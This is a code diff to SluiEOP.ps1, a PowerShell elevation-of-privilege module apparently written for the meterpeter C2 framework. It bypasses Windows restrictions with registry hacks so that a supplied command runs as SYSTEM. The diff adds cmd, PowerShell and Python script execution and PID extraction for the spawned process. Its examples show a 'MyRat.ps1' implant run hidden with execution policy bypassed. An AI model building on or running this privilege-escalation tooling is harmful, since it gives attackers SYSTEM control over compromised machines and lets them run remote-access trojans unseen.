@@ -21,17 +21,18 @@
    SluiEOP script was written as one meterpeter C2 Post-Exploitation module.
    This script 'reverts' regedit hacks to the previous state before the EOP.
    To run child binaries (.exe) through this module use: cmd /c start bin.exe
+   SluiEOP script supports [CMD|POWERSHELL|PYTHON] scripts execution 
 
 .EXAMPLE
-   PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
+   PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
    Execute notepad process with high privileges (SYSTEM)
 
 .EXAMPLE
-   PS C:\> ./SluiEOP.ps1 "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
+   PS C:\> .\SluiEOP.ps1 "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
    Execute powershell process with high privileges (SYSTEM)
 
 .EXAMPLE
-   PS C:\> ./SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
+   PS C:\> .\SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
    Execute $env:TMP\MyRat.ps1 script with high privileges (SYSTEM) in an hidden console.
 
 .INPUTS
@@ -103,15 +104,15 @@ If($CheckVuln -eq $True){
 
    <#
    .SYNOPSIS
-      Helper - Get the spawned <arch> <status> <ProcessName> and <PID>
+      Helper - Gets the spawned <arch> <ProcessName> <status> and <PID>
       Author: @r00t-3xp10it
 
    .DESCRIPTION
-      Displays Detailed Info (Arch|Status|ProcessName|PID) for those who run
+      Displays Detailed Info (Arch|ProcessName|Status|PID) for those who run
       SluiEOP outside meterpeter C2 And 'Basic' Information to meterpeter C2 users.
 
    .EXAMPLE
-      PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
+      PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
 
       Architecture ProccessName Status   PID
       ------------ ------------ ------   ---
@@ -121,7 +122,7 @@ If($CheckVuln -eq $True){
    ## Extracting attacker Spawned ProcessName PID
    If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[+] Building  EOP output Table displays.`n"}
    Start-Sleep -Milliseconds 500
-   If($Command -match ' ' -and $Command -match 'cmd'){
+   If($Command -match '^[cmd]' -and $Command -match ' ' -and $Command -NotMatch '.bat$' -and $Command -NotMatch '.ps1$' -and $Command -NotMatch '.py$'){
       ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
       $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
       If($ProcessName -match '.exe'){
@@ -143,11 +144,28 @@ If($CheckVuln -eq $True){
          $EOPID = "null"
       }
    }
-   ElseIf($Command -match '^[powershell]' -and $Command -match ' ' -and $Command -match '.ps1' -or $Command -match '.bat' -or $Command -match '.py'){
+   ## [CMD|POWERSHELL|PYTHON] (scripts) - interpreters supported
+   ElseIf($Command -match '^[powershell]' -or $Command -match '^[cmd]' -or $Command -match '^[python]' -and $Command -match ' ' -and $Command -match '.ps1$' -or $Command -match '.bat$' -or $Command -match '.py$'){
       ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
       $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
-      $EOPID = "null {script exec}"
-      $EOP_Success = $True
+      ## Extract powershell.exe interpreter process PID
+      If($Command -match '^[powershell]' -and $Command -match '.ps1$'){
+         $EOPID = Get-Process powershell -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         If($EOPID -match '^\d+$'){$EOP_Success = $True}
+      }
+      ## Extract cmd.exe interpreter process PID
+      ElseIf($Command -match '^[cmd]' -and $Command -match '.bat$'){
+         $EOPID = Get-Process cmd -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         If($EOPID -match '^\d+$'){$EOP_Success = $True} 
+      }
+      ## Extract python.exe interpreter process PID
+      ElseIf($Command -match '^[python]' -and $Command -match '.py$'){
+         $EOPID = Get-Process python -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         If($EOPID -match '^\d+$'){$EOP_Success = $True} 
+      }
+      Else{
+         $EOPID = "null"
+      }
    }
    Else{
       ## String: "powershell.exe"
